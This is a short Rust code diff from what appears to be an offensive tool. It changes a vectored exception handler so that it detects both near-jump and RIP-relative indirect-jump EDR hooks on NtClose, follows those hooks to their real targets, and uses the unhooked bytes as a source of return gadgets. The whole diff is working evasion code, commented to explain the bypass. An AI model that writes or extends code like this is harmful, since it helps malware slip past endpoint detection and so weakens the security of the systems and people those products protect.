@@ -46,8 +46,21 @@ unsafe extern "system" fn veh_handler(
                         .unwrap_or(0) as _;
                 if !nt_close.is_null() {
                     let p = nt_close as *const u8;
-                    // Check if NtClose starts with E9 (jmp), which typically indicates an EDR hook
-                    if *p != 0xE9 {
+                    // 0xE9 = near relative jmp (5 bytes): typical inline hook.
+                    // 0xFF 0x25 = indirect jmp via RIP-relative pointer (6 bytes):
+                    // common in 64-bit EDR hooks that redirect via a trampoline table.
+                    if *p == 0xFF && *p.add(1) == 0x25 {
+                        // Read the 4-byte signed RIP-relative displacement.
+                        let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
+                        // Slot address = end of instruction (p+6) + disp.
+                        let slot = (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
+                        // Dereference the slot to get the real target address.
+                        let target = std::ptr::read_unaligned(slot as *const usize);
+                        if target != 0 {
+                            ptr = target as *const u8;
+                        }
+                    } else if *p != 0xE9 {
+                        // Not a near-jmp hook: safe to use as ret-gadget source.
                         ptr = p;
                     }
                 }
